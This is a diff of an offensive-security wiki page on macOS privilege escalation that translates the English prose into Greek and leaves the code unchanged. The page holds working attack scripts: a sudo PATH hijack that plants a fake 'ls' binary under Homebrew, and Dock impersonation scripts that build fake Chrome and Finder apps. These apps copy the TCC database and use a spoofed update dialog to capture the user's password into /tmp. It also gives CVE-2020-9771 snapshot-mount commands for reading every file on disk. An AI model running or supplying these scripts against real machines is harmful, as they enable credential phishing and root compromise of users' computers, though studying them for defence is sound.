@@ -4,7 +4,7 @@
 
 ## TCC Privilege Escalation
 
-If you came here looking for TCC privilege escalation go to:
+Αν ήρθατε εδώ ψάχνοντας για TCC privilege escalation πηγαίνετε στο:
 
 {{#ref}}
 macos-security-protections/macos-tcc/
@@ -12,7 +12,7 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Please note that **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines. So see:
+Παρακαλώ σημειώστε ότι **οι περισσότερες από τις τεχνικές για privilege escalation που επηρεάζουν το Linux/Unix θα επηρεάσουν επίσης τα MacOS** μηχανήματα. Έτσι δείτε:
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
@@ -22,16 +22,15 @@ Please note that **most of the tricks about privilege escalation affecting Linux
 
 ### Sudo Hijacking
 
-You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/#sudo-hijacking).
+Μπορείτε να βρείτε την αρχική [τεχνική Sudo Hijacking μέσα στην ανάρτηση Linux Privilege Escalation](../../linux-hardening/privilege-escalation/#sudo-hijacking).
 
-However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim sill execute when **running sudo:**
-
+Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν εκτελεί **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να επιτευχθεί αυτή η επίθεση θα ήταν να **παρακάμψετε άλλες δυαδικές** που θα εκτελέσει το θύμα όταν **τρέχει sudo:**
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
 #!/bin/bash
 if [ "\$(id -u)" -eq 0 ]; then
-    whoami > /tmp/privesc
+whoami > /tmp/privesc
 fi
 /bin/ls "\$@"
 EOF
@@ -40,19 +39,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
+Σημειώστε ότι ένας χρήστης που χρησιμοποιεί το τερματικό θα έχει πολύ πιθανό **εγκατεστημένο το Homebrew**. Έτσι, είναι δυνατόν να υποκλέψετε δυαδικά αρχεία στο **`/opt/homebrew/bin`**.
 
-Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.
+### Υποκρισία Dock
 
-### Dock Impersonation
-
-Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:
+Χρησιμοποιώντας κάποια **κοινωνική μηχανική**, θα μπορούσατε να **υποκριθείτε για παράδειγμα το Google Chrome** μέσα στο dock και στην πραγματικότητα να εκτελέσετε το δικό σας σενάριο:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
-Some suggestions:
+Ορισμένες προτάσεις:
 
-- Check in the Dock if there is a Chrome, and in that case **remove** that entry and **add** the **fake** **Chrome entry in the same position** in the Dock array.&#x20;
-
+- Ελέγξτε στο Dock αν υπάρχει ένα Chrome, και σε αυτή την περίπτωση **αφαιρέστε** αυτή την καταχώρηση και **προσθέστε** την **ψεύτικη** **καταχώρηση Chrome στην ίδια θέση** στον πίνακα Dock.&#x20;
 ```bash
 #!/bin/sh
 
@@ -72,13 +69,13 @@ cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
 #include <unistd.h>
 
 int main() {
-    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
-                "sleep 2; "
-                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
-                "PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
-                "echo \$PASSWORD > /tmp/passwd.txt";
-    system(cmd);
-    return 0;
+char *cmd = "open /Applications/Google\\\\ Chrome.app & "
+"sleep 2; "
+"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
+"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
+"echo \$PASSWORD > /tmp/passwd.txt";
+system(cmd);
+return 0;
 }
 EOF
 
@@ -94,22 +91,22 @@ cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>CFBundleExecutable</key>
-    <string>Google Chrome</string>
-    <key>CFBundleIdentifier</key>
-    <string>com.google.Chrome</string>
-    <key>CFBundleName</key>
-    <string>Google Chrome</string>
-    <key>CFBundleVersion</key>
-    <string>1.0</string>
-    <key>CFBundleShortVersionString</key>
-    <string>1.0</string>
-    <key>CFBundleInfoDictionaryVersion</key>
-    <string>6.0</string>
-    <key>CFBundlePackageType</key>
-    <string>APPL</string>
-    <key>CFBundleIconFile</key>
-    <string>app</string>
+<key>CFBundleExecutable</key>
+<string>Google Chrome</string>
+<key>CFBundleIdentifier</key>
+<string>com.google.Chrome</string>
+<key>CFBundleName</key>
+<string>Google Chrome</string>
+<key>CFBundleVersion</key>
+<string>1.0</string>
+<key>CFBundleShortVersionString</key>
+<string>1.0</string>
+<key>CFBundleInfoDictionaryVersion</key>
+<string>6.0</string>
+<key>CFBundlePackageType</key>
+<string>APPL</string>
+<key>CFBundleIconFile</key>
+<string>app</string>
 </dict>
 </plist>
 EOF
@@ -122,18 +119,16 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 sleep 0.1
 killall Dock
 ```
-
 {{#endtab}}
 
 {{#tab name="Finder Impersonation"}}
-Some suggestions:
+Ορισμένες προτάσεις:
 
-- You **cannot remove Finder from the Dock**, so if you are going to add it to the Dock, you could put the fake Finder just next to the real one. For this you need to **add the fake Finder entry at the beginning of the Dock array**.
-- Another option is to not place it in the Dock and just open it, "Finder asking to control Finder" is not that weird.
-- Another options to **escalate to root without asking** the password with a horrible box, is make Finder really ask for the password to perform a privileged action:
-  - Ask Finder to copy to **`/etc/pam.d`** a new **`sudo`** file (The prompt asking for the password will indicate that "Finder wants to copy sudo")
-  - Ask Finder to copy a new **Authorization Plugin** (You could control the file name so the prompt asking for the password will indicate that "Finder wants to copy Finder.bundle")
-
+- Δεν **μπορείτε να αφαιρέσετε τον Finder από το Dock**, οπότε αν σκοπεύετε να τον προσθέσετε στο Dock, μπορείτε να τοποθετήσετε τον ψεύτικο Finder ακριβώς δίπλα στον πραγματικό. Για αυτό χρειάζεται να **προσθέσετε την ψεύτικη καταχώρηση Finder στην αρχή του πίνακα Dock**.
+- Μια άλλη επιλογή είναι να μην τον τοποθετήσετε στο Dock και απλώς να τον ανοίξετε, "Finder που ζητά να ελέγξει τον Finder" δεν είναι τόσο περίεργο.
+- Μια άλλη επιλογή για **να αποκτήσετε δικαιώματα root χωρίς να ζητήσετε** τον κωδικό πρόσβασης με ένα απαίσιο παράθυρο, είναι να κάνετε τον Finder να ζητήσει πραγματικά τον κωδικό πρόσβασης για να εκτελέσει μια προνομιούχα ενέργεια:
+- Ζητήστε από τον Finder να αντιγράψει στο **`/etc/pam.d`** ένα νέο **`sudo`** αρχείο (Η προτροπή που ζητά τον κωδικό πρόσβασης θα υποδεικνύει ότι "Ο Finder θέλει να αντιγράψει το sudo")
+- Ζητήστε από τον Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείτε να ελέγξετε το όνομα του αρχείου ώστε η προτροπή που ζητά τον κωδικό πρόσβασης να υποδεικνύει ότι "Ο Finder θέλει να αντιγράψει το Finder.bundle")
 ```bash
 #!/bin/sh
 
@@ -153,13 +148,13 @@ cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
 #include <unistd.h>
 
 int main() {
-    char *cmd = "open /System/Library/CoreServices/Finder.app & "
-                "sleep 2; "
-                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
-                "PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
-                "echo \$PASSWORD > /tmp/passwd.txt";
-    system(cmd);
-    return 0;
+char *cmd = "open /System/Library/CoreServices/Finder.app & "
+"sleep 2; "
+"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
+"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
+"echo \$PASSWORD > /tmp/passwd.txt";
+system(cmd);
+return 0;
 }
 EOF
 
@@ -175,22 +170,22 @@ cat << EOF > /tmp/Finder.app/Contents/Info.plist
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>CFBundleExecutable</key>
-    <string>Finder</string>
-    <key>CFBundleIdentifier</key>
-    <string>com.apple.finder</string>
-    <key>CFBundleName</key>
-    <string>Finder</string>
-    <key>CFBundleVersion</key>
-    <string>1.0</string>
-    <key>CFBundleShortVersionString</key>
-    <string>1.0</string>
-    <key>CFBundleInfoDictionaryVersion</key>
-    <string>6.0</string>
-    <key>CFBundlePackageType</key>
-    <string>APPL</string>
-    <key>CFBundleIconFile</key>
-    <string>app</string>
+<key>CFBundleExecutable</key>
+<string>Finder</string>
+<key>CFBundleIdentifier</key>
+<string>com.apple.finder</string>
+<key>CFBundleName</key>
+<string>Finder</string>
+<key>CFBundleVersion</key>
+<string>1.0</string>
+<key>CFBundleShortVersionString</key>
+<string>1.0</string>
+<key>CFBundleInfoDictionaryVersion</key>
+<string>6.0</string>
+<key>CFBundlePackageType</key>
+<string>APPL</string>
+<key>CFBundleIconFile</key>
+<string>app</string>
 </dict>
 </plist>
 EOF
@@ -203,17 +198,15 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 sleep 0.1
 killall Dock
 ```
-
 {{#endtab}}
 {{#endtabs}}
 
-## TCC - Root Privilege Escalation
+## TCC - Εκμετάλλευση Δικαιωμάτων Ρίζας
 
-### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+### CVE-2020-9771 - παράκαμψη TCC mount_apfs και εκμετάλλευση δικαιωμάτων
 
-**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
-The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.
-
+**Οποιοσδήποτε χρήστης** (ακόμα και αυτοί χωρίς δικαιώματα) μπορεί να δημιουργήσει και να τοποθετήσει ένα στιγμιότυπο μηχανής χρόνου και να **έχει πρόσβαση σε ΟΛΑ τα αρχεία** αυτού του στιγμιότυπου.\
+Η **μόνη προϋπόθεση** είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει **Πλήρη Πρόσβαση Δίσκου** (FDA) (`kTCCServiceSystemPolicyAllfiles`), η οποία πρέπει να παραχωρηθεί από έναν διαχειριστή.
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -233,12 +226,11 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
+Μια πιο λεπτομερής εξήγηση μπορεί να [**βρεθεί στην αρχική αναφορά**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
-A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+## Ευαίσθητες Πληροφορίες
 
-## Sensitive Information
-
-This can be useful to escalate privileges:
+Αυτό μπορεί να είναι χρήσιμο για την κλιμάκωση δικαιωμάτων:
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
